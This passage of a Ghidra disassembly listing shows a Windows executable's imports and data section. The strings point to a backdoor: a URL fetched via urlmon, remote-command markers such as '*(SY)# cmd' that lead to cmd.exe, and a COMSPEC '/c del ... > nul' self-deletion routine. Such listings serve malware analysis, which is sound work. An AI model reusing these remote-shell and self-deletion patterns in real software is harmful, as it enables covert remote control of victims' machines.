                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        004024a6 ad 01           dw         1ADh
        004024a8 47 65 74        ds         "GetShortPathNameA"
                 53 68 6f
                 72 74 50
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        004024ba 75 01           dw         175h
        004024bc 47 65 74        ds         "GetModuleFileNameA"
                 4d 6f 64
                 75 6c 65
        004024cf 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_DESCRIPTOR - DLL NAME                         *
                             **************************************************************
        004024d0 4b 45 52        ds         "KERNEL32.dll"
                 4e 45 4c
                 33 32 2e
        004024dd 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        004024de ca 01           dw         1CAh
        004024e0 4c 6f 61        ds         "LoadStringA"
                 64 53 74
                 72 69 6e
                             **************************************************************
                             * IMAGE_IMPORT_DESCRIPTOR - DLL NAME                         *
                             **************************************************************
        004024ec 55 53 45        ds         "USER32.dll"
                 52 33 32
                 2e 64 6c
        004024f7 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        004024f8 7e 00           dw         7Eh
        004024fa 53 48 43        ds         "SHChangeNotify"
                 68 61 6e
                 67 65 4e
        00402509 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        0040250a 09 01           dw         109h
        0040250c 53 68 65        ds         "ShellExecuteExA"
                 6c 6c 45
                 78 65 63
                             **************************************************************
                             * IMAGE_IMPORT_DESCRIPTOR - DLL NAME                         *
                             **************************************************************
        0040251c 53 48 45        ds         "SHELL32.dll"
                 4c 4c 33
                 32 2e 64
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        00402528 a5 00           dw         A5h
        0040252a 5f 62 65        ds         "_beginthread"
                 67 69 6e
                 74 68 72
        00402537 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        00402538 c5 01           dw         1C5h
        0040253a 5f 73 74        ds         "_strnicmp"
                 72 6e 69
                 63 6d 70 00
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        00402544 b2 02           dw         2B2h
        00402546 73 70 72        ds         "sprintf"
                 69 6e 74
                 66 00
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        0040254e 3e 02           dw         23Eh
        00402550 61 74 6f        ds         "atol"
                 6c 00
        00402555 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        00402556 b7 02           dw         2B7h
        00402558 73 74 72        ds         "strchr"
                 63 68 72 00
        0040255f 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        00402560 5e 02           dw         25Eh
        00402562 66 72 65        ds         "free"
                 65 00
        00402567 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        00402568 91 02           dw         291h
        0040256a 6d 61 6c        ds         "malloc"
                 6c 6f 63 00
        00402571 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_DESCRIPTOR - DLL NAME                         *
                             **************************************************************
        00402572 4d 53 56        ds         "MSVCRT.dll"
                 43 52 54
                 2e 64 6c
        0040257d 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        0040257e d3 00           dw         D3h
        00402580 5f 65 78        ds         "_exit"
                 69 74 00
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        00402586 48 00           dw         48h
        00402588 5f 58 63        ds         "_XcptFilter"
                 70 74 46
                 69 6c 74
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        00402594 49 02           dw         249h
        00402596 65 78 69        ds         "exit"
                 74 00
        0040259b 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        0040259c 8f 00           dw         8Fh
        0040259e 5f 61 63        ds         "_acmdln"
                 6d 64 6c
                 6e 00
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        004025a6 58 00           dw         58h
        004025a8 5f 5f 67        ds         "__getmainargs"
                 65 74 6d
                 61 69 6e
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        004025b6 0f 01           dw         10Fh
        004025b8 5f 69 6e        ds         "_initterm"
                 69 74 74
                 65 72 6d 00
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        004025c2 83 00           dw         83h
        004025c4 5f 5f 73        ds         "__setusermatherr"
                 65 74 75
                 73 65 72
        004025d5 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        004025d6 9d 00           dw         9Dh
        004025d8 5f 61 64        ds         "_adjust_fdiv"
                 6a 75 73
                 74 5f 66
        004025e5 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        004025e6 6a 00           dw         6Ah
        004025e8 5f 5f 70        ds         "__p__commode"
                 5f 5f 63
                 6f 6d 6d
        004025f5 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        004025f6 6f 00           dw         6Fh
        004025f8 5f 5f 70        ds         "__p__fmode"
                 5f 5f 66
                 6d 6f 64
        00402603 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        00402604 81 00           dw         81h
        00402606 5f 5f 73        ds         "__set_app_type"
                 65 74 5f
                 61 70 70
        00402615 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        00402616 ca 00           dw         CAh
        00402618 5f 65 78        ds         "_except_handler3"
                 63 65 70
                 74 5f 68
        00402629 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        0040262a b7 00           dw         B7h
        0040262c 5f 63 6f        ds         "_controlfp"
                 6e 74 72
                 6f 6c 66
        00402637 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_DESCRIPTOR - DLL NAME                         *
                             **************************************************************
        00402638 57 53 32        ds         "WS2_32.dll"
                 5f 33 32
                 2e 64 6c
        00402643 00              ??         00h
        00402644 75 72 6c        ds         "urlmon.dll"
                 6d 6f 6e
                 2e 64 6c
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        00402650 77 01           dw         177h
        00402652 47 65 74        ds         "GetModuleHandleA"
                 4d 6f 64
                 75 6c 65
        00402663 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        00402664 af 01           dw         1AFh
        00402666 47 65 74        ds         "GetStartupInfoA"
                 53 74 61
                 72 74 75
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        00402676 34 01           dw         134h
        00402678 5f 69 74        ds         "_itoa"
                 6f 61 00
        0040267e 00              ??         00h
        0040267f 00              ??         00h
        00402680 00              ??         00h
        00402681 00              ??         00h
        00402682 00              ??         00h
        00402683 00              ??         00h
        00402684 00              ??         00h
        00402685 00              ??         00h
        00402686 00              ??         00h
        00402687 00              ??         00h
        00402688 00              ??         00h
        00402689 00              ??         00h
        0040268a 00              ??         00h
        0040268b 00              ??         00h
        0040268c 00              ??         00h
        0040268d 00              ??         00h
        0040268e 00              ??         00h
        0040268f 00              ??         00h
        00402690 00              ??         00h
        00402691 00              ??         00h
        00402692 00              ??         00h
        00402693 00              ??         00h
        00402694 00              ??         00h
        00402695 00              ??         00h
        00402696 00              ??         00h
        00402697 00              ??         00h
        00402698 00              ??         00h
        00402699 00              ??         00h
        0040269a 00              ??         00h
        0040269b 00              ??         00h
        0040269c 00              ??         00h
        0040269d 00              ??         00h
        0040269e 00              ??         00h
        0040269f 00              ??         00h
        004026a0 00              ??         00h
        004026a1 00              ??         00h
        004026a2 00              ??         00h
        004026a3 00              ??         00h
        004026a4 00              ??         00h
        004026a5 00              ??         00h
        004026a6 00              ??         00h
        004026a7 00              ??         00h
        004026a8 00              ??         00h
        004026a9 00              ??         00h
        004026aa 00              ??         00h
        004026ab 00              ??         00h
        004026ac 00              ??         00h
        004026ad 00              ??         00h
        004026ae 00              ??         00h
        004026af 00              ??         00h
        004026b0 00              ??         00h
        004026b1 00              ??         00h
        004026b2 00              ??         00h
        004026b3 00              ??         00h
        004026b4 00              ??         00h
        004026b5 00              ??         00h
        004026b6 00              ??         00h
        004026b7 00              ??         00h
        004026b8 00              ??         00h
        004026b9 00              ??         00h
        004026ba 00              ??         00h
        004026bb 00              ??         00h
        004026bc 00              ??         00h
        004026bd 00              ??         00h
        004026be 00              ??         00h
        004026bf 00              ??         00h
        004026c0 00              ??         00h
        004026c1 00              ??         00h
        004026c2 00              ??         00h
        004026c3 00              ??         00h
        004026c4 00              ??         00h
        004026c5 00              ??         00h
        004026c6 00              ??         00h
        004026c7 00              ??         00h
        004026c8 00              ??         00h
        004026c9 00              ??         00h
        004026ca 00              ??         00h
        004026cb 00              ??         00h
        004026cc 00              ??         00h
        004026cd 00              ??         00h
        004026ce 00              ??         00h
        004026cf 00              ??         00h
        004026d0 00              ??         00h
        004026d1 00              ??         00h
        004026d2 00              ??         00h
        004026d3 00              ??         00h
        004026d4 00              ??         00h
        004026d5 00              ??         00h
        004026d6 00              ??         00h
        004026d7 00              ??         00h
        004026d8 00              ??         00h
        004026d9 00              ??         00h
        004026da 00              ??         00h
        004026db 00              ??         00h
        004026dc 00              ??         00h
        004026dd 00              ??         00h
        004026de 00              ??         00h
        004026df 00              ??         00h
        004026e0 00              ??         00h
        004026e1 00              ??         00h
        004026e2 00              ??         00h
        004026e3 00              ??         00h
        004026e4 00              ??         00h
        004026e5 00              ??         00h
        004026e6 00              ??         00h
        004026e7 00              ??         00h
        004026e8 00              ??         00h
        004026e9 00              ??         00h
        004026ea 00              ??         00h
        004026eb 00              ??         00h
        004026ec 00              ??         00h
        004026ed 00              ??         00h
        004026ee 00              ??         00h
        004026ef 00              ??         00h
        004026f0 00              ??         00h
        004026f1 00              ??         00h
        004026f2 00              ??         00h
        004026f3 00              ??         00h
        004026f4 00              ??         00h
        004026f5 00              ??         00h
        004026f6 00              ??         00h
        004026f7 00              ??         00h
        004026f8 00              ??         00h
        004026f9 00              ??         00h
        004026fa 00              ??         00h
        004026fb 00              ??         00h
        004026fc 00              ??         00h
        004026fd 00              ??         00h
        004026fe 00              ??         00h
        004026ff 00              ??         00h
        00402700 00              ??         00h
        00402701 00              ??         00h
        00402702 00              ??         00h
        00402703 00              ??         00h
        00402704 00              ??         00h
        00402705 00              ??         00h
        00402706 00              ??         00h
        00402707 00              ??         00h
        00402708 00              ??         00h
        00402709 00              ??         00h
        0040270a 00              ??         00h
        0040270b 00              ??         00h
        0040270c 00              ??         00h
        0040270d 00              ??         00h
        0040270e 00              ??         00h
        0040270f 00              ??         00h
        00402710 00              ??         00h
        00402711 00              ??         00h
        00402712 00              ??         00h
        00402713 00              ??         00h
        00402714 00              ??         00h
        00402715 00              ??         00h
        00402716 00              ??         00h
        00402717 00              ??         00h
        00402718 00              ??         00h
        00402719 00              ??         00h
        0040271a 00              ??         00h
        0040271b 00              ??         00h
        0040271c 00              ??         00h
        0040271d 00              ??         00h
        0040271e 00              ??         00h
        0040271f 00              ??         00h
        00402720 00              ??         00h
        00402721 00              ??         00h
        00402722 00              ??         00h
        00402723 00              ??         00h
        00402724 00              ??         00h
        00402725 00              ??         00h
        00402726 00              ??         00h
        00402727 00              ??         00h
        00402728 00              ??         00h
        00402729 00              ??         00h
        0040272a 00              ??         00h
        0040272b 00              ??         00h
        0040272c 00              ??         00h
        0040272d 00              ??         00h
        0040272e 00              ??         00h
        0040272f 00              ??         00h
        00402730 00              ??         00h
        00402731 00              ??         00h
        00402732 00              ??         00h
        00402733 00              ??         00h
        00402734 00              ??         00h
        00402735 00              ??         00h
        00402736 00              ??         00h
        00402737 00              ??         00h
        00402738 00              ??         00h
        00402739 00              ??         00h
        0040273a 00              ??         00h
        0040273b 00              ??         00h
        0040273c 00              ??         00h
        0040273d 00              ??         00h
        0040273e 00              ??         00h
        0040273f 00              ??         00h
        00402740 00              ??         00h
        00402741 00              ??         00h
        00402742 00              ??         00h
        00402743 00              ??         00h
        00402744 00              ??         00h
        00402745 00              ??         00h
        00402746 00              ??         00h
        00402747 00              ??         00h
        00402748 00              ??         00h
        00402749 00              ??         00h
        0040274a 00              ??         00h
        0040274b 00              ??         00h
        0040274c 00              ??         00h
        0040274d 00              ??         00h
        0040274e 00              ??         00h
        0040274f 00              ??         00h
        00402750 00              ??         00h
        00402751 00              ??         00h
        00402752 00              ??         00h
        00402753 00              ??         00h
        00402754 00              ??         00h
        00402755 00              ??         00h
        00402756 00              ??         00h
        00402757 00              ??         00h
        00402758 00              ??         00h
        00402759 00              ??         00h
        0040275a 00              ??         00h
        0040275b 00              ??         00h
        0040275c 00              ??         00h
        0040275d 00              ??         00h
        0040275e 00              ??         00h
        0040275f 00              ??         00h
        00402760 00              ??         00h
        00402761 00              ??         00h
        00402762 00              ??         00h
        00402763 00              ??         00h
        00402764 00              ??         00h
        00402765 00              ??         00h
        00402766 00              ??         00h
        00402767 00              ??         00h
        00402768 00              ??         00h
        00402769 00              ??         00h
        0040276a 00              ??         00h
        0040276b 00              ??         00h
        0040276c 00              ??         00h
        0040276d 00              ??         00h
        0040276e 00              ??         00h
        0040276f 00              ??         00h
        00402770 00              ??         00h
        00402771 00              ??         00h
        00402772 00              ??         00h
        00402773 00              ??         00h
        00402774 00              ??         00h
        00402775 00              ??         00h
        00402776 00              ??         00h
        00402777 00              ??         00h
        00402778 00              ??         00h
        00402779 00              ??         00h
        0040277a 00              ??         00h
        0040277b 00              ??         00h
        0040277c 00              ??         00h
        0040277d 00              ??         00h
        0040277e 00              ??         00h
        0040277f 00              ??         00h
        00402780 00              ??         00h
        00402781 00              ??         00h
        00402782 00              ??         00h
        00402783 00              ??         00h
        00402784 00              ??         00h
        00402785 00              ??         00h
        00402786 00              ??         00h
        00402787 00              ??         00h
        00402788 00              ??         00h
        00402789 00              ??         00h
        0040278a 00              ??         00h
        0040278b 00              ??         00h
        0040278c 00              ??         00h
        0040278d 00              ??         00h
        0040278e 00              ??         00h
        0040278f 00              ??         00h
        00402790 00              ??         00h
        00402791 00              ??         00h
        00402792 00              ??         00h
        00402793 00              ??         00h
        00402794 00              ??         00h
        00402795 00              ??         00h
        00402796 00              ??         00h
        00402797 00              ??         00h
        00402798 00              ??         00h
        00402799 00              ??         00h
        0040279a 00              ??         00h
        0040279b 00              ??         00h
        0040279c 00              ??         00h
        0040279d 00              ??         00h
        0040279e 00              ??         00h
        0040279f 00              ??         00h
        004027a0 00              ??         00h
        004027a1 00              ??         00h
        004027a2 00              ??         00h
        004027a3 00              ??         00h
        004027a4 00              ??         00h
        004027a5 00              ??         00h
        004027a6 00              ??         00h
        004027a7 00              ??         00h
        004027a8 00              ??         00h
        004027a9 00              ??         00h
        004027aa 00              ??         00h
        004027ab 00              ??         00h
        004027ac 00              ??         00h
        004027ad 00              ??         00h
        004027ae 00              ??         00h
        004027af 00              ??         00h
        004027b0 00              ??         00h
        004027b1 00              ??         00h
        004027b2 00              ??         00h
        004027b3 00              ??         00h
        004027b4 00              ??         00h
        004027b5 00              ??         00h
        004027b6 00              ??         00h
        004027b7 00              ??         00h
        004027b8 00              ??         00h
        004027b9 00              ??         00h
        004027ba 00              ??         00h
        004027bb 00              ??         00h
        004027bc 00              ??         00h
        004027bd 00              ??         00h
        004027be 00              ??         00h
        004027bf 00              ??         00h
        004027c0 00              ??         00h
        004027c1 00              ??         00h
        004027c2 00              ??         00h
        004027c3 00              ??         00h
        004027c4 00              ??         00h
        004027c5 00              ??         00h
        004027c6 00              ??         00h
        004027c7 00              ??         00h
        004027c8 00              ??         00h
        004027c9 00              ??         00h
        004027ca 00              ??         00h
        004027cb 00              ??         00h
        004027cc 00              ??         00h
        004027cd 00              ??         00h
        004027ce 00              ??         00h
        004027cf 00              ??         00h
        004027d0 00              ??         00h
        004027d1 00              ??         00h
        004027d2 00              ??         00h
        004027d3 00              ??         00h
        004027d4 00              ??         00h
        004027d5 00              ??         00h
        004027d6 00              ??         00h
        004027d7 00              ??         00h
        004027d8 00              ??         00h
        004027d9 00              ??         00h
        004027da 00              ??         00h
        004027db 00              ??         00h
        004027dc 00              ??         00h
        004027dd 00              ??         00h
        004027de 00              ??         00h
        004027df 00              ??         00h
        004027e0 00              ??         00h
        004027e1 00              ??         00h
        004027e2 00              ??         00h
        004027e3 00              ??         00h
        004027e4 00              ??         00h
        004027e5 00              ??         00h
        004027e6 00              ??         00h
        004027e7 00              ??         00h
        004027e8 00              ??         00h
        004027e9 00              ??         00h
        004027ea 00              ??         00h
        004027eb 00              ??         00h
        004027ec 00              ??         00h
        004027ed 00              ??         00h
        004027ee 00              ??         00h
        004027ef 00              ??         00h
        004027f0 00              ??         00h
        004027f1 00              ??         00h
        004027f2 00              ??         00h
        004027f3 00              ??         00h
        004027f4 00              ??         00h
        004027f5 00              ??         00h
        004027f6 00              ??         00h
        004027f7 00              ??         00h
        004027f8 00              ??         00h
        004027f9 00              ??         00h
        004027fa 00              ??         00h
        004027fb 00              ??         00h
        004027fc 00              ??         00h
        004027fd 00              ??         00h
        004027fe 00              ??         00h
        004027ff 00              ??         00h
                             //
                             // .data
                             // ram:00403000-ram:00403627
                             //
                             DAT_00403000                                    XREF[2]:     00400234(*), entry:00401d9a(*)
        00403000 00              ??         00h
        00403001 00              ??         00h
        00403002 00              ??         00h
        00403003 00              ??         00h
                             DAT_00403004                                    XREF[1]:     entry:00401d95(*)
        00403004 00              ??         00h
        00403005 00              ??         00h
        00403006 00              ??         00h
        00403007 00              ??         00h
                             DAT_00403008                                    XREF[1]:     entry:00401d67(*)
        00403008 00              ??         00h
        00403009 00              ??         00h
        0040300a 00              ??         00h
        0040300b 00              ??         00h
                             DAT_0040300c                                    XREF[1]:     entry:00401d62(*)
        0040300c 00              ??         00h
        0040300d 00              ??         00h
        0040300e 00              ??         00h
        0040300f 00              ??         00h
        00403010 1c              ??         1Ch                                              ?  ->  0040301c
        00403011 30              ??         30h    0
        00403012 40              ??         40h    @
        00403013 00              ??         00h
        00403014 11              ??         11h
        00403015 3a              ??         3Ah    :
        00403016 6d              ??         6Dh    m
        00403017 d2              ??         D2h
        00403018 27              ??         27h    '
        00403019 e9              ??         E9h
        0040301a b9              ??         B9h
        0040301b 31 68 74        ds         "1http://www.ueopen.com/test.html"
                 74 70 3a
                 2f 2f 77
        0040303c 00              ??         00h
        0040303d 00              ??         00h
        0040303e 00              ??         00h
        0040303f 00              ??         00h
                             **************************************************************
                             * _Str2 parameter of _strnicmp                               *
                             *                                                            *
                             **************************************************************
                             s_*(SY)#_cmd_00403040                           XREF[1]:     FUN_00401320:00401598(*)
        00403040 2a 28 53        ds         "*(SY)# cmd"
                 59 29 23
                 20 63 6d
        0040304b 00              ??         00h
                             **************************************************************
                             * _Str2 parameter of _strnicmp                               *
                             *                                                            *
                             **************************************************************
                             s_*(SY)#_0040304c                               XREF[1]:     FUN_00401320:00401580(*)
        0040304c 2a 28 53        ds         "*(SY)#"
                 59 29 23 00
        00403053 00              ??         00h
                             **************************************************************
                             * _Format parameter of sprintf                               *
                             *                                                            *
                             **************************************************************
                             s_send_=_%d_00403054                            XREF[2]:     FUN_00401320:00401521(*),
                                                                                          FUN_00401320:00401531(*)
        00403054 73 65 6e        ds         "send = %d"
                 64 20 3d
                 20 25 64 00
        0040305e 00              ??         00h
        0040305f 00              ??         00h
                             s_*(SY)#_00403060                               XREF[4]:     FUN_00401320:00401491(*),
                                                                                          FUN_00401320:0040149c(R),
                                                                                          FUN_00401320:004014af(R),
                                                                                          FUN_00401320:004014b8(R)
        00403060 2a 28 53        ds         "*(SY)# "
                 59 29 23
                 20 00
                             s_cmd.exe_00403068                              XREF[1]:     FUN_00401860:004018d3(*)
        00403068 63 6d 64        ds         "cmd.exe"
                 2e 65 78
                 65 00
        00403070 65              ??         65h    e
        00403071 78              ??         78h    x
        00403072 69              ??         69h    i
        00403073 74              ??         74h    t
        00403074 0d              ??         0Dh
        00403075 0a              ??         0Ah
        00403076 00              ??         00h
        00403077 00              ??         00h
                             DAT_00403078                                    XREF[1]:     FUN_00401b50:00401c16(*)
        00403078 4f              ??         4Fh    O
        00403079 70              ??         70h    p
        0040307a 65              ??         65h    e
        0040307b 6e              ??         6Eh    n
        0040307c 00              ??         00h
        0040307d 00              ??         00h
        0040307e 00              ??         00h
        0040307f 00              ??         00h
                             **************************************************************
                             * lpString2 parameter of lstrcatA                            *
                             *                                                            *
                             **************************************************************
                             s_>_nul_00403080                                XREF[1]:     FUN_00401b50:00401be1(*)
        00403080 20 3e 20        ds         " > nul"
                 6e 75 6c 00
        00403087 00              ??         00h
                             **************************************************************
                             * lpString2 parameter of lstrcpyA                            *
                             *                                                            *
                             **************************************************************
                             s_/c_del_00403088                               XREF[1]:     FUN_00401b50:00401bb9(*)
        00403088 2f 63 20        ds         "/c del "
                 64 65 6c
                 20 00
                             **************************************************************
                             * lpName parameter of GetEnvironmentVariableA                *
                             *                                                            *
                             **************************************************************
                             s_COMSPEC_00403090                              XREF[1]:     FUN_00401b50:00401b9f(*)
        00403090 43 4f 4d        ds         "COMSPEC"
                 53 50 45
                 43 00
                             DAT_00403098                                    XREF[1]:     entry:00401d49(R)
        00403098 01 00 00 00     undefined4 00000001h
        0040309c 00              ??         00h
        0040309d 00              ??         00h
        0040309e 00              ??         00h
        0040309f 00              ??         00h
                             **************************************************************
                             * lpBuffer parameter of LoadStringA                          *
                             *                                                            *
                             * _Str parameter of strchr                                   *
                             *                                                            *
                             **************************************************************
                             _Str_004030a0+1                                 XREF[9,1]:   FUN_00401240:00401249(*),
                             lpBuffer_004030a0                                            FUN_00401240:00401257(*),
                             _Str_004030a0                                                FUN_00401320:0040132c(*),
                                                                                          FUN_00401320:0040133a(*),
                                                                                          FUN_00401320:00401353(*),
                                                                                          FUN_00401320:00401361(R),
                                                                                          FUN_00401320:00401368(R),
                                                                                          FUN_00401320:0040136e(*),
                                                                                          FUN_00401320:0040138c(*),
                                                                                          FUN_00401320:00401385(*)
        004030a0 00 00 00 00     LPSTR      00000000
        004030a4 00              ??         00h
        004030a5 00              ??         00h
        004030a6 00              ??         00h
        004030a7 00              ??         00h
        004030a8 00              ??         00h
        004030a9 00              ??         00h
        004030aa 00              ??         00h
        004030ab 00              ??         00h
        004030ac 00              ??         00h
        004030ad 00              ??         00h
        004030ae 00              ??         00h
        004030af 00              ??         00h
        004030b0 00              ??         00h
        004030b1 00              ??         00h
        004030b2 00              ??         00h
        004030b3 00              ??         00h
        004030b4 00              ??         00h
        004030b5 00              ??         00h
        004030b6 00              ??         00h
        004030b7 00              ??         00h
        004030b8 00              ??         00h
        004030b9 00              ??         00h
        004030ba 00              ??         00h
        004030bb 00              ??         00h
        004030bc 00              ??         00h
        004030bd 00              ??         00h
        004030be 00              ??         00h
        004030bf 00              ??         00h
        004030c0 00              ??         00h
        004030c1 00              ??         00h
        004030c2 00              ??         00h
        004030c3 00              ??         00h
        004030c4 00              ??         00h
        004030c5 00              ??         00h
        004030c6 00              ??         00h
        004030c7 00              ??         00h
        004030c8 00              ??         00h
        004030c9 00              ??         00h
        004030ca 00              ??         00h
        004030cb 00              ??         00h
        004030cc 00              ??         00h
        004030cd 00              ??         00h
        004030ce 00              ??         00h
        004030cf 00              ??         00h
        004030d0 00              ??         00h
        004030d1 00              ??         00h
        004030d2 00              ??         00h
        004030d3 00              ??         00h
                             DAT_004030d4                                    XREF[1]:     FUN_004012c0:004012e1(W)
        004030d4 00              ??         00h
        004030d5 00              ??         00h
        004030d6 00              ??         00h
        004030d7 00              ??         00h
                             DAT_004030d8                                    XREF[3]:     FUN_004012c0:004012da(W),
                                                                                          FUN_004012c0:004012fe(R),
                                                                                          FUN_004012c0:00401310(R)
        004030d8 00 00 00 00     undefined4 00000000h
        004030dc 00              ??         00h
        004030dd 00              ??         00h
        004030de 00              ??         00h
        004030df 00              ??         00h
                             DAT_004030e0                                    XREF[2]:     FUN_004012c0:004012ed(*),
                                                                                          FUN_004012c0:004012f2(W)
        004030e0 00 00 00 00     undefined4 00000000h
        004030e4 00              ??         00h
        004030e5 00              ??         00h
        004030e6 00              ??         00h
        004030e7 00              ??         00h
        004030e8 00              ??         00h
        004030e9 00              ??         00h
        004030ea 00              ??         00h
        004030eb 00              ??         00h
        004030ec 00              ??         00h
        004030ed 00              ??         00h
        004030ee 00              ??         00h
        004030ef 00              ??         00h
        004030f0 00              ??         00h
        004030f1 00              ??         00h
        004030f2 00              ??         00h
        004030f3 00              ??         00h
        004030f4 00              ??         00h
        004030f5 00              ??         00h
        004030f6 00              ??         00h
        004030f7 00              ??         00h
        004030f8 00              ??         00h
        004030f9 00              ??         00h
        004030fa 00              ??         00h
        004030fb 00              ??         00h
        004030fc 00              ??         00h
        004030fd 00              ??         00h
        004030fe 00              ??         00h
        004030ff 00              ??         00h
        00403100 00              ??         00h
        00403101 00              ??         00h
        00403102 00              ??         00h
        00403103 00              ??         00h
        00403104 00              ??         00h
        00403105 00              ??         00h
        00403106 00              ??         00h
        00403107 00              ??         00h
        00403108 00              ??         00h
        00403109 00              ??         00h
        0040310a 00              ??         00h
        0040310b 00              ??         00h
        0040310c 00              ??         00h
        0040310d 00              ??         00h
        0040310e 00              ??         00h
        0040310f 00              ??         00h
        00403110 00              ??         00h
        00403111 00              ??         00h
        00403112 00              ??         00h
        00403113 00              ??         00h
        00403114 00              ??         00h
        00403115 00              ??         00h
        00403116 00              ??         00h
        00403117 00              ??         00h
        00403118 00              ??         00h
        00403119 00              ??         00h
        0040311a 00              ??         00h
        0040311b 00              ??         00h
        0040311c 00              ??         00h
        0040311d 00              ??         00h
        0040311e 00              ??         00h
        0040311f 00              ??         00h
        00403120 00              ??         00h
        00403121 00              ??         00h
        00403122 00              ??         00h
        00403123 00              ??         00h
        00403124 00              ??         00h
        00403125 00              ??         00h
        00403126 00              ??         00h
        00403127 00              ??         00h
        00403128 00              ??         00h
        00403129 00              ??         00h
        0040312a 00              ??         00h
        0040312b 00              ??         00h
        0040312c 00              ??         00h
        0040312d 00              ??         00h
        0040312e 00              ??         00h
        0040312f 00              ??         00h
        00403130 00              ??         00h
        00403131 00              ??         00h
        00403132 00              ??         00h
        00403133 00              ??         00h
        00403134 00              ??         00h
        00403135 00              ??         00h
        00403136 00              ??         00h
        00403137 00              ??         00h
        00403138 00              ??         00h
        00403139 00              ??         00h
        0040313a 00              ??         00h
        0040313b 00              ??         00h
        0040313c 00              ??         00h
        0040313d 00              ??         00h
        0040313e 00              ??         00h
        0040313f 00              ??         00h
        00403140 00              ??         00h
        00403141 00              ??         00h
        00403142 00              ??         00h
        00403143 00              ??         00h
        00403144 00              ??         00h
        00403145 00              ??         00h
        00403146 00              ??         00h
        00403147 00              ??         00h
        00403148 00              ??         00h
        00403149 00              ??         00h
        0040314a 00              ??         00h
        0040314b 00              ??         00h
        0040314c 00              ??         00h
        0040314d 00              ??         00h
        0040314e 00              ??         00h
        0040314f 00              ??         00h
        00403150 00              ??         00h
        00403151 00              ??         00h
        00403152 00              ??         00h
        00403153 00              ??         00h
        00403154 00              ??         00h
        00403155 00              ??         00h
        00403156 00              ??         00h
        00403157 00              ??         00h
        00403158 00              ??         00h
        00403159 00              ??         00h
        0040315a 00              ??         00h
        0040315b 00              ??         00h
        0040315c 00              ??         00h
        0040315d 00              ??         00h
        0040315e 00              ??         00h
        0040315f 00              ??         00h
        00403160 00              ??         00h
        00403161 00              ??         00h
        00403162 00              ??         00h
        00403163 00              ??         00h
        00403164 00              ??         00h
        00403165 00              ??         00h
        00403166 00              ??         00h
        00403167 00              ??         00h
        00403168 00              ??         00h
        00403169 00              ??         00h
        0040316a 00              ??         00h
        0040316b 00              ??         00h
        0040316c 00              ??         00h
        0040316d 00              ??         00h
        0040316e 00              ??         00h
        0040316f 00              ??         00h
        00403170 00              ??         00h
        00403171 00              ??         00h
        00403172 00              ??         00h
        00403173 00              ??         00h
        00403174 00              ??         00h
        00403175 00              ??         00h
        00403176 00              ??         00h
        00403177 00              ??         00h
        00403178 00              ??         00h
        00403179 00              ??         00h
        0040317a 00              ??         00h
        0040317b 00              ??         00h
        0040317c 00              ??         00h
        0040317d 00              ??         00h
        0040317e 00              ??         00h
        0040317f 00              ??         00h
        00403180 00              ??         00h
        00403181 00              ??         00h
        00403182 00              ??         00h
        00403183 00              ??         00h
        00403184 00              ??         00h
        00403185 00              ??         00h
        00403186 00              ??         00h
        00403187 00              ??         00h
        00403188 00              ??         00h
        00403189 00              ??         00h
        0040318a 00              ??         00h
        0040318b 00              ??         00h
        0040318c 00              ??         00h
        0040318d 00              ??         00h
        0040318e 00              ??         00h
        0040318f 00              ??         00h
        00403190 00              ??         00h
        00403191 00              ??         00h
        00403192 00              ??         00h
        00403193 00              ??         00h
        00403194 00              ??         00h
        00403195 00              ??         00h
        00403196 00              ??         00h
        00403197 00              ??         00h
        00403198 00              ??         00h
        00403199 00              ??         00h
        0040319a 00              ??         00h
        0040319b 00              ??         00h
        0040319c 00              ??         00h
        0040319d 00              ??         00h
        0040319e 00              ??         00h
        0040319f 00              ??         00h
        004031a0 00              ??         00h
        004031a1 00              ??         00h
        004031a2 00              ??         00h
        004031a3 00              ??         00h
        004031a4 00              ??         00h
        004031a5 00              ??         00h
